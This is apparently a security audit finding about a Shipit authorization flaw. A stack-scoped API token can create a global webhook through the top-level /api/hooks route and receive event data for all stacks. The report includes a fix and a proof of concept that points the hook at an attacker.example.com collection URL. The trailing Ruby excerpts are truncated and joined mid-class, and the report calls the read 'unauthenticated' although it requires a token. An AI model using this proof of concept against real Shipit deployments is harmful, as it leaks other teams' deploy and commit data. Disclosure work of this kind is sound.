### Title
Stack-scoped ApiClient can create a global Hook and receive event data (deploy output URLs, commit info, task streams) for every stack in the deployment - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
An `ApiClient` scoped to a single `Stack` (via `ApiClient#stack_id`) is only supposed to authorize `read`/`write`/`deploy`/`lock` operations against that one stack. However the `write:hook` permission is not bound to the client's own `stack_id`. By hitting the top-level, un-scoped `/api/hooks` route (as opposed to the nested `/api/stacks/:stack_id/hooks` route), a client that owns `write:hook` can create a `Hook` with `stack_id: nil`, i.e. a **global** hook. Global hooks receive events (`deploy`, `task`, `rollback`, `lock`, `commit_status`, etc., see `Hook::EVENTS`) for *every* stack in the system, not just the stack the token was scoped to. This breaks the binding: `stack a token authorizes == stack whose events the token's hook can observe`.

### Finding Description
`Shipit::ApiClient` can optionally be bound to a single stack: `belongs_to :stack, optional: true` [1](#0-0) . `Api::BaseController#stacks` enforces this scoping for stack-related reads/writes: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) .

`Api::HooksController`, however, only requires the generic `read:hook` / `write:hook` permissions - it never checks `current_api_client.stack_id` against the hook being created: `require_permission :write, :hook, only: %i[create update destroy]` ... `def hooks; Hook.where(stack_id:); end` ... `def stack_id; stack.id if params[:stack_id].present?; end` [3](#0-2) . When `params[:stack_id]` is absent (which happens on the top-level route `resources :hooks, only: %i[index create show update destroy]` mounted directly under `namespace :api`, separate from the stack-nested `resources :hooks` route) [4](#0-3) , `stack_id` resolves to `nil`, so `Hook.where(stack_id: nil).create(params)` creates a hook with `stack_id: nil` - a global hook - with no verification that the calling `ApiClient` is even permitted to act outside of its own bound stack.

`Hook.deliver` explicitly includes global hooks (`stack_id: nil`) when delivering events for *any* stack: `scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }` and `Hook.deliver(event, stack_id, payload)` calls `for_stack(stack_id)` [5](#0-4) . `Hook.emit` is invoked from application code whenever a `deploy`, `task`, `rollback`, `lock`, etc. event happens on *any* stack, and delivers the payload (which includes stack/commit/deploy output identifiers) to every listening global hook via `DeliverHookJob` [6](#0-5) .

### Impact Explanation
This is the analog of the `ShortRecord`/NFT binding bug: a credential ("token") is authorized for one specific scope (a single `Stack`), but the object it's allowed to create (`Hook`) is not constrained to that scope, letting the token "touch" every stack instead of only the one it was authorized for. Because `Hook::EVENTS` includes `deploy`, `task`, and `commit_status`, an attacker holding only a single-stack-scoped `write:hook` token can register a webhook receiver at an attacker-controlled URL and passively receive event payloads (containing deploy output links / task output links, commit shas, stack identifiers) for every stack managed by the Shipit instance - an unauthenticated read of stack state/deploy output belonging to repositories/stacks the token was never authorized to access. This matches the "High" impact bucket ("unauthenticated read of stack state, task streams or deploy output").

### Likelihood Explanation
Requires possession of a legitimately-issued `ApiClient` token that has been granted `write:hook` and is scoped to one stack - this is an "unprivileged" attacker only in the sense that they are unprivileged relative to *other* stacks; they are a valid, if limited, token holder. Since `write:hook` is a normal permission that stack owners routinely grant to CI/CD integrations, and the top-level `/api/hooks` route is documented and reachable without any additional check, exploitation requires no special access beyond having such a token - no repository write access, no admin session, no TLS interception.

### Recommendation
In `Api::HooksController`, reject (or force-scope) hook creation/listing/updating to the calling `ApiClient`'s own `stack_id` when the client is stack-scoped: e.g. `raise InsufficientPermission if current_api_client.stack_id? && stack_id.nil?` or simply default `stack_id` to `current_api_client.stack_id` instead of `nil`, and disallow updating/destroying hooks whose `stack_id` doesn't match the client's own stack.

### Proof of Concept
1. Create an `ApiClient` (via `api_clients#create`, requires only a logged-in Shipit user) scoped to `stack: "org/repo/production"` with `permissions: ["write:hook"]` (no `read:stack`/`write:stack` needed).
2. Authenticate as that client and `POST /api/hooks` (top-level route, no `stack_id` in path/params) with `{ delivery_url: "https://attacker.example.com/collect", events: ["deploy", "task", "commit_status"] }`. Per `HooksController#create`/`#stack_id`, this succeeds and creates a `Hook` with `stack_id: nil`.
3. Trigger (or wait for) a deploy/task on an unrelated stack, e.g. `org/other-repo/staging`, that the `ApiClient` was never authorized to read (`current_api_client.stack_id` only allows `org/repo/production`).
4. Observe that `Hook.deliver` / `Hook.emit` delivers that unrelated stack's event payload (including deploy output link, commit sha, task id) to `https://attacker.example.com/collect`, confirming information for a stack outside the token's authorized scope was exfiltrated using a permission (`write:hook`) that was supposed to be constrained to the token's own stack.

# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)

module Shipit

    end
